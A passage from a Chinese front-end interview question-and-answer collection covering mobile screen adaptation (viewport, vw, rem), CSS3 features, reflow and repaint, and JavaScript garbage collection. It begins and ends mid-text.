margin会发生重叠)。所以当两个相邻块级子元素分属于不同的BFC时可以阻止margin重叠。这里给任一个相邻块级盒子的外面包一个div，通过改变此div的属性使两个原盒子分属于两个不同的BFC，以此来阻止margin重叠。 5、移动端适配方案参考答案： 适配思路 设计稿（750*1334） —&gt; 开发 —&gt; 适配不同的手机屏幕，使其显得合理 原则 开发时方便，写代码时设置的值要和标注的 160px 相关 方案要适配大多数手机屏幕，并且无 BUG 用户体验要好，页面看着没有不适感 思路 写页面时，按照设计稿写固定宽度，最后再统一缩放处理，在不同手机上都能用 按照设计稿的标准开发页面，在手机上部分内容根据屏幕宽度等比缩放，部分内容按需要变化，需要缩放的元素使用 rem, vw 相对单位，不需要缩放的使用 px 固定尺寸+弹性布局，不需要缩放 viewport 适配 根据设计稿标准（750px 宽度）开发页面，写完后页面及元素自动缩小，适配 375 宽度的屏幕 在 head 里设置如下代码 &lt;meta name=\"viewport\" content=\"width=750,initial-scale=0.5\"> initial-scale &#x3D; 屏幕的宽度 &#x2F; 设计稿的宽度 为了适配其他屏幕，需要动态的设置 initial-scale 的值 &lt;head> &lt;script> const WIDTH = 750 const mobileAdapter = () => &#123; let scale = screen.width / WIDTH let content = `width=$&#123;WIDTH&#125;, initial-scale=$&#123;scale&#125;, maximum-scale=$&#123;scale&#125;, minimum-scale=$&#123;scale&#125;` let meta = document.querySelector('meta[name=viewport]') if (!meta) &#123; meta = document.createElement('meta') meta.setAttribute('name', 'viewport') document.head.appendChild(meta) &#125; meta.setAttribute('content',content) &#125; mobileAdapter() window.onorientationchange = mobileAdapter //屏幕翻转时再次执行 &lt;/script> &lt;/head> 缺点就是边线问题，不同尺寸下，边线的粗细是不一样的（等比缩放后），全部元素都是等比缩放，实际显示效果可能不太好 vw 适配（部分等比缩放） 开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标注是基于此宽度标注） 开始开发，对设计稿的标注进行转换，把px换成vw。比如页面元素字体标注的大小是32px，换成vw为 (100&#x2F;750)*32 vw 对于需要等比缩放的元素，CSS使用转换后的单位 对于不需要缩放的元素，比如边框阴影，使用固定单位px 关于换算，为了开发方便，利用自定义属性，CSS变量 &lt;head> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1\"> &lt;script> const WIDTH = 750 //:root &#123; --width: 0.133333 &#125; 1像素等于多少 vw document.documentElement.style.setProperty('--width', (100 / WIDTH)) &lt;/script> &lt;/head> 注意此时，meta 里就不要去设置缩放了 业务代码里就可以写 header &#123; font-size: calc(28vw * var(--width)) &#125; 实现了按需缩放 rem 适配 开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标是基于此宽度标注） 开始开发，对设计稿的标注进行转换 对于需要等比缩放的元素，CSS使用转换后的单位 对于不需要缩放的元素，比如边框阴影，使用固定单位px 假设设计稿的某个字体大小是 40px, 手机屏幕上的字体大小应为 420&#x2F;750*40 &#x3D; 22.4px (体验好)，换算成 rem（相对于 html 根节点，假设 html 的 font-size &#x3D; 100px,）则这个字体大小为 0.224 rem 写样式时，对应的字体设置为 0.224 rem 即可，其他元素尺寸也做换算… 但是有问题 举个 ，设计稿的标注 是40px，写页面时还得去做计算，很麻烦（全部都要计算） 能不能规定一下，看到 40px ,就应该写 40&#x2F;100 &#x3D; 0.4 rem,这样看到就知道写多少了（不用计算），此时的 html 的 font-size 就不能是 100px 了，应该为 (420*100)&#x2F;750 &#x3D; 56px，100为我们要规定的那个参数 根据不同屏幕宽度，设置 html 的 font-size 值 &lt;head> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1\"> &lt;script> const WIDTH = 750 //设计稿尺寸 const setView = () => &#123; document.documentElement.style.fontSize = (100 * screen.width / WIDTH) + 'px' &#125; window.onorientationchange = setView setView() &lt;/script> &lt;/head> 对于需要等比缩放的元素，CSS使用转换后的单位 header &#123; font-size: .28rem; &#125; 对于不需要缩放的元素，比如边框阴影，使用固定单位px header > span.active &#123; color: #fff; border-bottom: 2px solid rgba(255, 255, 255, 0.3); &#125; 假设 html 的 font size &#x3D; 1px 的话，就可以写 28 rem 了，更方便了，但是浏览器对字体大小有限制，设为 1px 的话，在浏览器中是失效的，会以 12px（或者其他值） 做一个计算 , 就会得到一个很夸张的结果，所以可以把 html 写的大一些 使用 sass 库时 JS 处理还是一样的，但看着好看些 @function px2rem($px) &#123; @return $px * 1rem / 100; &#125; header &#123; font-size: px2rem(28); &#125; 以上的三种适配方案，都是等比缩放，放到 ipad 上时（设计稿以手机屏幕设计的），页面元素会很大很丑，有些场景下，并不需要页面整体缩放（viewport 自动处理的也很好了），所以有时只需要合理的布局即可。 弹性盒适配（合理布局） &lt;meta name=\"viewport\" content=\"width=device-width\"> 使用 flex 布局 section &#123; display: flex; &#125; 总结一下，什么样的页面需要做适配（等比缩放）呢 页面中的布局是栅格化的 换了屏幕后，到底有多宽多高很难去做设置，整体的都需要改变，所以需要整体的缩放 头屏大图，宽度自适应，高度固定的话，对于不同的屏幕，形状就会发生改变（放到ipad上就变成长条了），宽度变化后，高度也要保持等比例变化 以上所有的适配都是宽度的适配，但是在某些场景下，也会出现高度的适配 比如大屏，需要适配很多的电视尺寸，要求撑满屏幕，不能有滚动条，此时若换个屏幕 此时需要考虑小元素用 vh, 宽和高都用 vh 去表示，中间的大块去自适应，这就做到了大屏的适配，屏幕变小了，整体变小了（体验更好），中间这块撑满了屏幕 对于更复杂的场景，需要更灵活考虑，没有一种适配方式可以囊括所有场景。 6、css3新特性参考答案： CSS3 边框 在 css3 中新增的边框属性如下： 创建圆角 语法： border-radius : length length; length： 由浮点数字和单位标识符组成的长度值（如：20px）。不可为负值，如果为负值则与0展示效果一样。第一个值设置其水平半径，第二个值设置其垂直半径，如果第二个值省略则默认第二个值等于第一个值。 div&#123; border: 1px solid; /* 设置每个圆角水平半径和垂直半径都为30px */ border-radius: 30px; &#125; border-radius 是4个角的缩写方法。四个角的表示顺序与border类似按照border-top-left-radius、border-top-right-radius、border-bottom-right-radius、border-bottom-left-radius的顺序来设置： div&#123; border: 1px solid; /* 如果 / 前后的值都存在，那么 / 前面的值设置其水平半径，/ 后面值设置其垂直半径，如果没有 / ，则水平和垂直半径相等 */ border-radius: 10px 15px 20px 30px / 20px 30px 10px 15px; /* 上面写法等价于下面的写法，第一个值是水平半径，第二个值是垂直半径 */ border-top-left-radius: 10px 20px; border-top-right-radius: 15px 30px; border-bottom-right-radius: 20px 10px; border-bottom-left-radius: 30px 15px; &#125; border-radius 指定不同数量的值遵循对角相等的原则，即指定了值的取指定值，没有指定值的与对角值相等，对角相等模型 边框阴影 通过属性box-shadow 向边框添加阴影。 语法： &#123;box-shadow : [inset] x-offset y-offset blur-radius extension-radius spread-radiuscolor&#125; 说明：对象选择器 {box-shadow:[投影方式] X轴偏移量 Y轴偏移量 模糊半径 阴影扩展半径 阴影颜色} div&#123; /* 内阴影，向右偏移10px，向下偏移10px，模糊半径5px，阴影缩小10px */ box-shadow: inset 10px 10px 5px -10px #888888; &#125; 边框图片 语法： border-image : border-image-source || border-image-slice [ / border-image-width] || border-image-repeat border-image ： none | image [ number | percentage]&#123;1,4&#125; [ / border-width&gt;&#123;1,4&#125; ] ? [ stretch | repeat | round ]&#123;0,2&#125; div&#123; border-image:url(border.png) 30 30 round; border-image: url(border.png) 20/10px repeat; &#125; CSS3 背景 background-size 属性 在 CSS3 之前，背景图片的尺寸是由图片的实际尺寸决定的。在 CSS3 中，可以设置背景图片的尺寸，这就允许我们在不同的环境中重复使用背景图片。可以像素或百分比规定尺寸。如果以百分比规定尺寸，那么尺寸相对于父元素的宽度和高度。 div&#123; background:url(bg_flower.gif); /* 通过像素规定尺寸 */ background-size:63px 100px; /* 通过百分比规定尺寸 */ background-size:100% 50%; background-repeat:no-repeat; &#125; background-origin 属性 规定背景图片的定位区域，背景图片可以放置于 content-box、padding-box 或 border-box 区域， div&#123; background:url(bg_flower.gif); background-repeat:no-repeat; background-size:100% 100%; /* 规定背景图片的定位区域 */ background-origin:content-box; &#125; background-clip 属性 与background-origin 属性相似，规定背景颜色的绘制区域，区域划分与background-origin 属性相同。 div&#123; background-color:yellow; background-clip:content-box; &#125; CSS3 多重背景图片 CSS3 允许为元素设置多个背景图像 body&#123; background-image:url(bg_flower.gif),url(bg_flower_2.gif); &#125; CSS3 文本效果 text-shadow 属性 给为本添加阴影，能够设置水平阴影、垂直阴影、模糊距离，以及阴影的颜色。 h1&#123; text-shadow: 5px 5px 5px #FF0000; &#125; text-wrap 属性 设置区域内的自动换行。 语法：text-wrap: normal | none | unrestricted | suppress | break-word; /* 允许对长单词进行拆分，并换行到下一行 */ p &#123;word-wrap:break-word;&#125; 值 描述 normal 只在允许的换行点进行换行。 none 不换行。元素无法容纳的文本会溢出。 break-word 在任意两个字符间换行。 suppress 压缩元素中的换行。浏览器只在行中没有其他有效换行点时进行换行。 CSS3 字体 字体定义 在 CSS3 之前，web 设计师必须使用已在用户计算机上安装好的字体。但是通过 CSS3，web 设计师可以使用他 们喜欢的任意字体。当找到或购买到希望使用的字体时，可将该字体文件存放到 web 服务器上，它会在需要时 被自动下载到用户的计算机上。字体需要在 CSS3 @font-face 规则中定义。 /* 定义字体 */ @font-face&#123; font-family: myFont; src: url('Sansation_Light.ttf'), url('Sansation_Light.eot'); /* IE9+ */ &#125; div&#123; font-family:myFont; &#125; 使用粗体字体 “Sansation_Light.ttf”文件 是定义的正常字体，”Sansation_Bold.ttf” 是另一个字体文件，它包含了 Sansation 字体的粗体字符。只要 font-family 为 “myFirstFont” 的文本需要显示为粗体，浏览器就会使用该字体。 （其实没弄清楚这样处理的原因，经测试直接在html中通过 b 标签也可以实现加粗的效果） /* 定义正常字体 */ @font-face&#123; font-family: myFirstFont; src: url('/example/css3/Sansation_Light.ttf'), url('/example/css3/Sansation_Light.eot'); /* IE9+ */ &#125; /* 定义粗体时使用的字体 */ @font-face&#123; font-family: myFirstFont; src: url('/example/css3/Sansation_Bold.ttf'), url('/example/css3/Sansation_Bold.eot'); /* IE9+ */ /* 标识属性 */ font-weight:bold; &#125; div&#123; font-family:myFirstFont; &#125; CSS3 2D 转换 通过 CSS3 转换，我们能够对元素进行移动、缩放、转动、拉长或拉伸，转换是使元素改变形状、尺寸和位置的一种效果。 translate() 方法 通过 translate(x , y) 方法，元素根据给定的 left（x 坐标） 和 top（y 坐标） 位置参数从其当前位置移动，x为正值向右移动，为负值向左移动；y为正值向下移动，为负值向上移动； div&#123; transform: translate(50px,100px); -ms-transform: translate(50px,100px); /* IE 9 */ -webkit-transform: translate(50px,100px); /* Safari and Chrome */ -o-transform: translate(50px,100px); /* Opera */ -moz-transform: translate(50px,100px); /* Firefox */ &#125; rotate() 方法 控制元素顺时针旋转给定的角度。为正值，元素将顺时针旋转。为负值，元素将逆时针旋转。 div&#123; transform: rotate(30deg); -ms-transform: rotate(30deg); /* IE 9 */ -webkit-transform: rotate(30deg); /* Safari and Chrome */ -o-transform: rotate(30deg); /* Opera */ -moz-transform: rotate(30deg); /* Firefox */ &#125; scale() 方法 根据给定的宽度（X 轴）和高度（Y 轴）参数，控制元素的尺寸的增加、减少。 div&#123; transform: scale(2,4); -ms-transform: scale(2,4); /* IE 9 */ -webkit-transform: scale(2,4); /* Safari 和 Chrome */ -o-transform: scale(2,4); /* Opera */ -moz-transform: scale(2,4); /* Firefox */ &#125; skew() 方法 根据给定的水平线（X 轴）和垂直线（Y 轴）参数设置元素翻转给定的角度。 /* 设置围绕 X 轴把元素翻转 30 度，围绕 Y 轴翻转 20 度。 */ div&#123; transform: skew(30deg,20deg); -ms-transform: skew(30deg,20deg); /* IE 9 */ -webkit-transform: skew(30deg,20deg); /* Safari and Chrome */ -o-transform: skew(30deg,20deg); /* Opera */ -moz-transform: skew(30deg,20deg); /* Firefox */ &#125; matrix() 方法 matrix() 方法把所有 2D 转换方法组合在一起。matrix() 方法需要六个参数，包含数学函数，允许旋转、缩放、移动以及倾斜元素。 /* 使用 matrix 方法将 div 元素旋转 30 度 */ div&#123; transform:matrix(0.866,0.5,-0.5,0.866,0,0); -ms-transform:matrix(0.866,0.5,-0.5,0.866,0,0); /* IE 9 */ -moz-transform:matrix(0.866,0.5,-0.5,0.866,0,0); /* Firefox */ -webkit-transform:matrix(0.866,0.5,-0.5,0.866,0,0); /* Safari and Chrome */ -o-transform:matrix(0.866,0.5,-0.5,0.866,0,0); /* Opera */ &#125; 2D Transform 方法汇总 函数 描述 matrix(n,n,n,n,n,n) 定义 2D 转换，使用六个值的矩阵。 translate(x,y) 定义 2D 转换，沿着 X 和 Y 轴移动元素。 translateX(n) 定义 2D 转换，沿着 X 轴移动元素。 translateY(n) 定义 2D 转换，沿着 Y 轴移动元素。 scale(x,y) 定义 2D 缩放转换，改变元素的宽度和高度。 scaleX(n) 定义 2D 缩放转换，改变元素的宽度。 scaleY(n) 定义 2D 缩放转换，改变元素的高度。 rotate(angle) 定义 2D 旋转，在参数中规定角度。 skew(x-angle,y-angle) 定义 2D 倾斜转换，沿着 X 和 Y 轴。 skewX(angle) 定义 2D 倾斜转换，沿着 X 轴。 skewY(angle) 定义 2D 倾斜转换，沿着 Y 轴。 CSS3 3D 转换 CSS3 允许使用 3D 转换来对元素进行格式化 rotateX() 方法 /* 设置元素围绕其 X 轴以给定的度数进行旋转 */ div&#123; transform: rotateX(120deg); -webkit-transform: rotateX(120deg); /* Safari 和 Chrome */ -moz-transform: rotateX(120deg); /* Firefox */ &#125; rotateY() 旋转 /* 设置元素围绕其 Y 轴以给定的度数进行旋转 */ div&#123; transform: rotateY(130deg); -webkit-transform: rotateY(130deg); /* Safari 和 Chrome */ -moz-transform: rotateY(130deg); /* Firefox */ &#125; CSS3 过渡 通过 CSS3可以在不使用 Flash 动画或 JavaScript 的情况下，当元素从一种样式变换为另一种样式时为元素添加效果。 要实现这一点，必须规定以下两项内容： 设置添加过渡效果的 CSS 属性； 设置过渡效果的时长； 注意： 如果时长未设置，则不会有过渡效果，因为默认值是 0。 单项改变 /* 设置将变化效果添加在“宽度”上，时长为2秒；该时长在其他属性上并不适用 */ div&#123; transition: width 2s; -moz-transition: width 2s; /* Firefox 4 */ -webkit-transition: width 2s; /* Safari 和 Chrome */ -o-transition: width 2s; /* Opera */ &#125; /* 配合在一起使用的效果就是当鼠标移上去的时候宽度变为300px，这个过程耗时2秒 */ div:hover&#123; width:300px; &#125; 注意： 当鼠标移出元素时，它会逐渐变回原来的样式。 多项改变 如需向多个样式添加过渡效果，请添加多个属性，由逗号隔开。 /* 同时向宽度、高度和转换添加过渡效果 */ div&#123; transition: width 2s, height 2s, transform 2s; -moz-transition: width 2s, height 2s, -moz-transform 2s; -webkit-transition: width 2s, height 2s, -webkit-transform 2s; -o-transition: width 2s, height 2s,-o-transform 2s; &#125; /* 当鼠标移上时宽度和高度都变成200px，同时旋转180度，每个属性变化都耗时2秒 */ div:hover&#123; width:200px; height:200px; transform:rotate(180deg); -moz-transform:rotate(180deg); /* Firefox 4 */ -webkit-transform:rotate(180deg); /* Safari and Chrome */ -o-transform:rotate(180deg); /* Opera */ &#125; 过渡属性详解 transition 是简写属性， 语法： transition : transition-property | transition-duration | transition-timing-function | transition-delay; /* 设置在宽度上添加过渡效果，时长为1秒，过渡效果时间曲线为linear，等待2秒后开始过渡 */ div&#123; transition: width 1s linear 2s; -moz-transition: width 1s linear 2s; /* Firefox 4 */ -webkit-transition: width 1s linear 2s; /* Safari and Chrome */ -o-transition: width 1s linear 2s; /* Opera */ &#125; 属性 描述 transition 简写属性，用于在一个属性中设置四个过渡属性。 transition-property 规定应用过渡的 CSS 属性的名称。 transition-duration 定义过渡效果花费的时间。默认是 0。 transition-timing-function 规定过渡效果的时间曲线。默认是 “ease”。 transition-delay 规定过渡效果何时开始。默认是 0。 CSS3 动画 通过 CSS3可以创建动画，这些动画可以取代网页中的画图片、Flash 动画以及 JavaScript。 CSS3 中通过@keyframes 规则来创建动画。在 @keyframes 中规定某项 CSS 样式，就能创建由当前样式（动画开始前的样式）逐渐改为新样式（需要变到的样式）的动画效果。 通过from , to关键字设置动画发生的时间 /* 通过@keyframes 创建动画 */ @keyframes myfirst&#123; from &#123;background: red;&#125; to &#123;background: yellow;&#125; &#125; /* Firefox */ @-moz-keyframes myfirst &#123; from &#123;background: red;&#125; to &#123;background: yellow;&#125; &#125; /* Safari 和 Chrome */ @-webkit-keyframes myfirst &#123; from &#123;background: red;&#125; to &#123;background: yellow;&#125; &#125; /* Opera */ @-o-keyframes myfirst &#123; from &#123;background: red;&#125; to &#123;background: yellow;&#125; &#125; /* 将创建的动画绑定到选择器，并至少指定以下两项 CSS3 动画属性 1.指定动画的名称； 2.指定动画的时长； */ div&#123; animation: myfirst 5s; -moz-animation: myfirst 5s; /* Firefox */ -webkit-animation: myfirst 5s; /* Safari 和 Chrome */ -o-animation: myfirst 5s; /* Opera */ &#125; 通过百分比设置动画发生的时间 动画是使元素从一种样式逐渐变化为另一种样式的效果。可以改变任意多的样式任意多的次数。可以用关键词 “from” 和 “to”来设置动画变化发生的时间，其效果等同于 0% 和 100%。0% 是动画的开始，100% 是动画的完成。为了得到最佳的浏览器支持，应该始终定义 0% 和 100% 选择器。 /* 当动画为 25% 及 50% 时改变背景色，然后当动画 100% 完成时再次改变 */ @keyframes myfirst&#123; 0% &#123;background: red;&#125; 25% &#123;background: yellow;&#125; 50% &#123;background: blue;&#125; 100% &#123;background: green;&#125; &#125; /* 同时改变背景色和位置 */ @keyframes myfirst&#123; 0% &#123;background: red; left:0px; top:0px;&#125; 25% &#123;background: yellow; left:200px; top:0px;&#125; 50% &#123;background: blue; left:200px; top:200px;&#125; 75% &#123;background: green; left:0px; top:200px;&#125; 100% &#123;background: red; left:0px; top:0px;&#125; &#125; 动画属性详解 animation 是除了 animation-play-state 属性所有动画属性的简写属性。 语法： animation : animation-name | animation-duration | animation-timing-function | animation-delay | animation-iteration-count | animation-direction /* 应用的动画为myfirst，一个动画周期为5秒，动画的速度曲线为linear，动画2秒后播放，播放次数为infinite，即无限循环，动画下一周期是否逆向播放取值alternate，即逆向播放 */ div&#123; animation: myfirst 5s linear 2s infinite alternate; /* Firefox: */ -moz-animation: myfirst 5s linear 2s infinite alternate; /* Safari 和 Chrome: */ -webkit-animation: myfirst 5s linear 2s infinite alternate; /* Opera: */ -o-animation: myfirst 5s linear 2s infinite alternate; &#125; 属性 描述 @keyframes 规定动画。 animation 所有动画属性的简写属性，除了 animation-play-state 属性。 animation-name 规定 @keyframes 动画的名称。 animation-duration 规定动画完成一个周期所花费的秒或毫秒。默认是 0。 animation-timing-function 规定动画的速度曲线。默认是 “ease”。 animation-delay 规定动画何时开始。默认是 0。 animation-iteration-count 规定动画被播放的次数。默认是 1。 animation-direction 规定动画是否在下一周期逆向地播放。默认是 “normal”。 animation-play-state 规定动画是否正在运行或暂停。默认是 “running”。 animation-fill-mode 规定对象动画时间之外的状态。 CSS3 多列 通过 CSS3够创建多个列来对文本进行布局，就像我们经常看到的报纸的布局一样。 CSS3 创建多列 column-count 属性规定元素应该被分隔的列数。 /* 将div中的文本分为3列 */ div&#123; column-count:3; -moz-column-count:3; /* Firefox */ -webkit-column-count:3; /* Safari 和 Chrome */ &#125; CSS3 规定列之间的间隔 column-gap 属性规定列之间的间隔。 /* 设置列之间的间隔为 40 像素 */ div&#123; column-gap:40px; -moz-column-gap:40px; /* Firefox */ -webkit-column-gap:40px; /* Safari 和 Chrome */ &#125; CSS3 列规则 column-rule 属性设置列之间的宽度、样式和颜色规则。 语法： column-rule : column-rule-width | column-rule-style | column-rule-color div&#123; column-rule:3px outset #ff0000; -moz-column-rule:3px outset #ff0000; /* Firefox */ -webkit-column-rule:3px outset #ff0000; /* Safari and Chrome */ &#125; 属性 描述 column-count 规定元素应该被分隔的列数。 column-fill 规定如何填充列。 column-gap 规定列之间的间隔。 column-rule 设置所有 column-rule-* 属性的简写属性。 column-rule-width 规定列之间规则的宽度。 column-rule-style 规定列之间规则的样式。 column-rule-color 规定列之间规则的颜色。 column-span 规定元素应该横跨的列数。 column-width 规定列的宽度。 columns 语法 : column-width column-count。 CSS3 用户界面 CSS3 resize 在 CSS3中resize 属性设置是否可由用户调整元素尺寸。 /* 设置div可以由用户调整大小 */ div&#123; resize:both; overflow:auto; &#125; CSS3 box-sizing box-sizing 属性允许您以确切的方式定义适应某个区域的具体内容。边框计算在width中 /* 规定两个并排的带边框方框 */ div&#123; box-sizing:border-box; -moz-box-sizing:border-box; /* Firefox */ -webkit-box-sizing:border-box; /* Safari */ width:50%; float:left; &#125; CSS3 outline-offset outline-offset 属性对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。 轮廓与边框有两点不同： 轮廓不占用空间； 轮廓可能是非矩形； /* 规定边框边缘之外 15 像素处的轮廓 */ div&#123; border:2px solid black; outline:2px solid red; outline-offset:15px; &#125; 浏览器1、localStorage 能跨域吗参考答案： 不能 解决方案： 通过postMessage来实现跨源通信 可以实现一个公共的iframe部署在某个域名中，作为共享域 将需要实现localStorage跨域通信的页面嵌入这个iframe 接入对应的SDK操作共享域，从而实现localStorage的跨域存储 2、浏览器输入URL发生了什么参考答案： URL 解析 DNS 查询 TCP 连接 处理请求 接受响应 渲染页面 3、重绘、重排区别如何避免参考答案： 重排(Reflow)：当渲染树的一部分必须更新并且节点的尺寸发生了变化，浏览器会使渲染树中受到影响的部分失效，并重新构造渲染树。 重绘(Repaint)：是在一个元素的外观被改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制，使元素呈现新的外观。比如改变某个元素的背景色、文字颜色、边框颜色等等 区别：重绘不一定需要重排（比如颜色的改变），重排必然导致重绘（比如改变网页位置） 引发重排 4.1 添加、删除可见的dom 4.2 元素的位置改变 4.3 元素的尺寸改变(外边距、内边距、边框厚度、宽高、等几何属性) 4.4 页面渲染初始化 4.5 浏览器窗口尺寸改变 4.6 获取某些属性。当获取一些属性时，浏览器为取得正确的值也会触发重排,它会导致队列刷新，这些属性包括：offsetTop、offsetLeft、 offsetWidth、offsetHeight、scrollTop、scrollLeft、scrollWidth、scrollHeight、clientTop、clientLeft、clientWidth、clientHeight、getComputedStyle() (currentStyle in IE)。所以，在多次使用这些值时应进行缓存。 优化： 浏览器自己的优化： 浏览器会维护1个队列，把所有会引起重排，重绘的操作放入这个队列，等队列中的操作到一定数量或者到了一定时间间隔，浏览器就会flush队列，进行一批处理，这样多次重排，重绘变成一次重排重绘 减少 reflow&#x2F;repaint：（1）不要一条一条地修改 DOM 的样式。可以先定义好 css 的 class，然后修改 DOM 的 className。 （2）不要把 DOM 结点的属性值放在一个循环里当成循环里的变量。（3）为动画的 HTML 元件使用 fixed 或 absoult 的 position，那么修改他们的 CSS 是不会 reflow 的。（4）千万不要使用 table 布局。因为可能很小的一个小改动会造成整个 table 的重新布局。(table及其内部元素除外，它可能需要多次计算才能确定好其在渲染树中节点的属性，通常要花3倍于同等元素的时间。这也是为什么我们要避免使用table做布局的一个原因。) （5）不要在布局信息改变的时候做查询（会导致渲染队列强制刷新） 4、let a &#x3D; “sssssss”，分别存在哪儿？参考答案： 使用let声明的全局变量不是挂在window对象下的，声明的全局变量存在于一个块级作用域中。 具体查看，我们可以通过打印一个全局函数，在let声明的全局变量在全局函数的scope下，我们平时使用时直接 用变量名称就能访问 5、浏览器垃圾回收机制参考答案： 1. 介绍 浏览器的 Javascript 具有自动垃圾回收机制(GC:Garbage Collecation)，也就是说，执行环境会负责管理代码执行过程中使用的内存。其原理是：垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存。但是这个过程不是实时的，因为其开销比较大并且GC时停止响应其他操作，所以垃圾回收器会按照固定的时间间隔周期性的执行。 不再使用的变量也就是生命周期结束的变量，当然只可能是局部变量，全局变量的生命周期直至浏览器卸载页面才会结束。局部变量只在函数的执行过程中存在，而在这个过程中会为局部变量在栈或堆上分配相应的空间，以存储它们的值，然后在函数中使用这些变量，直至函数结束，而闭包中由于内部函数的原因，外部函数并不能算是结束。 还是上代码说明吧： function fn1() &#123; var obj = &#123;name: 'hanzichi', age: 10&#125;; &#125; function fn2() &#123; var obj = &#123;name:'hanzichi', age: 10&#125;; return obj; &#125; var a = fn1(); var b = fn2(); 复制代码 我们来看代码是如何执行的。首先定义了两个function，分别叫做fn1和fn2，当fn1被调用时，进入fn1的环境，会开辟一块内存存放对象{name: ‘hanzichi’, age: 10}，而当调用结束后，出了fn1的环境，那么该块内存会被js引擎中的垃圾回收器自动释放；在fn2被调用的过程中，返回的对象被全局变量b所指向，所以该块内存并不会被释放。 这里问题就出现了：到底哪个变量是没有用的？所以垃圾收集器必须跟踪到底哪个变量没用，对于不再有用的变量打上标记，以备将来收回其内存。用于标记的无用变量的策略可能因实现而有所区别，通常情况下有两种实现方式：标记清除和引用计数。引用计数不太常用，标记清除较为常用。 2. 标记清除 js中最常用的垃圾回收方式就是标记清除。当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。 function test()&#123; var a = 10 ; //被标记 ，进入环境 var b = 20 ; //被标记 ，进入环境 &#125; test(); //执行完毕 之后 a、b又被标离开环境，被回收。 复制代码 垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。 到目前为止，IE9+、Firefox、Opera、Chrome、Safari的js实现使用的都是标记清除的垃圾回收策略或类似的策略，只不过垃圾收集的时间间隔互不相同。 3. 引用计数 引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。 function test()&#123; var a = &#123;&#125; ; //a的引用次数为0 var b = a ; //a的引用次数加1，为1 var c =a; //a的引用次数再加1，为2 var b =&#123;&#125;; //a的引用次数减1，为1 &#125; 复制代码 Netscape Navigator3是最早使用引用计数策略的浏览器，但很快它就遇到一个严重的问题：循环引用。循环引用指的是对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的引用。 function fn() &#123; var a = &#123;&#125;; var b = &#123;&#125;; a.pro = b; b.pro = a; &#125; fn(); 复制代码 以上代码a和b的引用次数都是2，fn()执行完毕后，两个对象都已经离开环境，在标记清除方式下是没有问题的，但是在引用计数策略下，因为a和b的引用次数不为0，所以不会被垃圾回收器回收内存，如果fn函数被大量调用，就会造成内存泄露。在IE7与IE8上，内存直线上升。 我们知道，IE中有一部分对象并不是原生js对象。例如，其内存泄露DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。因此，即使IE的js引擎采用标记清除策略来实现，但js访问的COM对象依然是基于引用计数策略的。换句话说，只要在IE中涉及COM对象，就会存在循环引用的问题。 var element = document.getElementById(\"some_element\"); var myObject = new Object(); myObject.e = element; element.o = myObject; 复制代码 这个例子在一个DOM元素（element)与一个原生js对象（myObject)之间创建了循环引用。其中，变量myObject有一个属性e指向element对象；而变量element也有一个属性o回指myObject。由于存在这个循环引用，即使例子中的DOM从页面中移除，它也永远不会被回收。 举个栗子： 黄色是指直接被 js变量所引用，在内存里 红色是指间接被 js变量所引用，如上图，refB 被 refA 间接引用，导致即使 refB 变量被清空，也是不会被回收的 子元素 refB 由于 parentNode 的间接引用，只要它不被删除，它所有的父元素（图中红色部分）都不会被删除 另一个例子： window.onload=function outerFunction()&#123; var obj = document.getElementById(\"element\"); obj.onclick=function innerFunction()&#123;&#125;; &#125;; 复制代码 这段代码看起来没什么问题，但是obj引用了document.getElementById(‘element’)，而document.getElementById(‘element’)的onclick方法会引用外部环境中的变量，自然也包括obj，是不是很隐蔽啊。(在比较新的浏览器中在移除Node的时候已经会移除其上的event了，但是在老的浏览器，特别是ie上会有这个bug) 解决办法： 最简单的方式就是自己手工解除循环引用，比如刚才的函数可以这样 myObject.element = null; element.o = null; window.onload=function outerFunction()&#123; var obj = document.getElementById(\"element\"); obj.onclick=function innerFunction()&#123;&#125;; obj=null; &#125;; 复制代码 将变量设置为null意味着切断变量与它此前引用的值之间的连接。当垃圾回收器下次运行时，就会删除这些值并回收它们占用的内存。 要注意的是，IE9+并不存在循环引用导致Dom内存泄露问题，可能是微软做了优化，或者Dom的回收方式已经改变 4. 内存管理 4.1 什么时候触发垃圾回收？ 垃圾回收器周期性运行，如果分配的内存非常多，那么回收工作也会很艰巨，确定垃圾回收时间间隔就变成了一个值得思考的问题。IE6的垃圾回收是根据内存分配量运行的，当环境中存在256个变量、4096个对象、64k的字符串任意一种情况的时候就会触发垃圾回收器工作，看起来很科学，不用按一段时间就调用一次，有时候会没必要，这样按需调用不是很好吗？但是如果环境中就是有这么多变量等一直存在，现在脚本如此复杂，很正常，那么结果就是垃圾回收器一直在工作，这样浏览器就没法儿玩儿了。 微软在IE7中做了调整，触发条件不再是固定的，而是动态修改的，初始值和IE6相同，如果垃圾回收器回收的内存分配量低于程序占用内存的15%，说明大部分内存不可被回收，设的垃圾回收触发条件过于敏感，这时候把临街条件翻倍，如果回收的内存高于85%，说明大部分内存早就该清理了，这时候把触发条件置回。这样就使垃圾回收工作职能了很多 4.2 合理的GC方案 